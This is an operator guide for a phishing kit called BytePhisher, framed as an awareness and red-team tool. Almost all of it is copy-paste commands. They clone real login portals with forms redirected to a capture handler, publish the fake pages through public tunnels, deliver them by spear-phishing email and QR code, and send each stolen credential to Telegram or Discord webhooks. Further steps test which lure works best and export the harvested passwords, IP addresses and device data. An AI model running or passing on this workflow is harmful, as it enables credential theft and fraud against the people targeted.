# BytePhisher — operator guide

Practical walkthrough for running an awareness/red-team campaign end to end.
Everything below was executed against this build; commands are copy-paste ready.

## 0. One-time install

```bash
git clone <repo> bytephisher && cd bytephisher
make install            # venv + deps + 179 templates
./.venv/bin/python bytephisher.py --list | head
```

## 1. Pick a template

```bash
./.venv/bin/python bytephisher.py --list           # numbered 1..179
./.venv/bin/python bytephisher.py -o 3             # by index
./.venv/bin/python bytephisher.py -o google        # by slug
```

Custom page (your client's real SSO portal, so the awareness test is credible):

```bash
./.venv/bin/python tools/import_site.py --url https://sso.client.example/login \
        --name "Client SSO" --slug client-sso
# -> imports the markup, absolutises assets, points forms at the capture handler,
#    extracts field names, generates an OTP page, registers a new template index
```

## 2. Decide how it is exposed

| Mode | Flag | When |
|---|---|---|
| Local only | `-m test` | dry runs, screenshots, internal demo |
| Cloudflare quick tunnel | `-t cloudflared` | fastest public HTTPS link (auto-downloads the binary) |
| localhost.run | `-t localhost_run` | no account, ssh only |
| bore | `-t bore` | plain HTTP fallback, auto-downloads the binary |
| all of them | `-t all` | prints every link that came up; dead services are reported, not hidden |

```bash
./.venv/bin/python bytephisher.py -o google -t cloudflared --geo ipapi --otp
```

A real run prints something like:

```
[bytephisher] template : Google
[bytephisher] server up on 0.0.0.0:8080
[bytephisher] public URLs:
   cloudflared    https://<random>.trycloudflare.com
```

## 3. Extra delivery channels

```bash
# QR code for posters / stickers / WhatsApp
... --qr data/campaign_qr.png

# spear-phishing email with the live link (SMTP from config/config.yaml)
... --mailto target@client.example --mail-template security_alert

# instant pings for every capture
... --telegram "BOT_TOKEN:CHAT_ID" --webhook https://discord.com/api/webhooks/...
```

## 4. Campaign hygiene

* `--campaign q3-payroll` tags every capture, so several campaigns can share one
  database and still report separately.
* `--rotate google,instagram` serves a random template per request (A/B testing
  which lure converts).
* Risk scoring labels scanners and bots automatically — you do not need to
  throw their rows away, the report separates "credential pairs" from
  "credible (low risk) credential pairs".

## 5. Watch it live

```bash
# rich dashboard in the terminal (default when stdout is a TTY)
./.venv/bin/python bytephisher.py -o google -t cloudflared

# plain refresher for logs / systemd / tmux capture
./.venv/bin/python bytephisher.py -o google -t cloudflared --no-tui

# remote/mobile: Flask dashboard + JSON API
./.venv/bin/python bytephisher.py -o google -t cloudflared --web-dashboard --web-port 8090
curl -s localhost:8090/api/stats
curl -s 'localhost:8090/api/captures?limit=5&campaign=q3-payroll'
```

## 6. Take the data out

```bash
./.venv/bin/python bytephisher.py --export data/captures.csv      # CSV, risk column included
./.venv/bin/python tools/report.py --out data/report.html         # single-file HTML report
./.venv/bin/python tools/report.py --campaign q3-payroll --qr https://link --out q3.html
```

The HTML report is self-contained (no CDN, no JS) — attach it to a client email
or print it to PDF.

## 7. Shut down cleanly

`Ctrl+C` prints the session summary and terminates every tunneler it started:

```
  runtime            : 12m 4s
  total captures     : 37
  credential captures: 11
  unique visitors    : 64
  public urls: cloudflared https://<random>.trycloudflare.com
  tunnels stopped    : 1
```

## 8. Verify the build yourself

```bash
make test         # full suite incl. live tunnels, SMTP, public-URL round trips
make test-fast    # everything that does not need the internet
make probe        # which tunnelers actually work right now
```

## Operational cautions

* Every rendered page carries a visible "security-awareness demonstration"
  footer; keep it for awareness work and only remove it where the engagement
  brief says so.
* Tunnel URLs are public. Treat the link as you would a live credential-
  harvesting page: short windows, named campaigns, scoped audiences.
* Captures land in SQLite with IP, geo, ISP, UA, device and risk. That is
  personal data — delete `data/` when the engagement ends unless the client
  contract says otherwise.
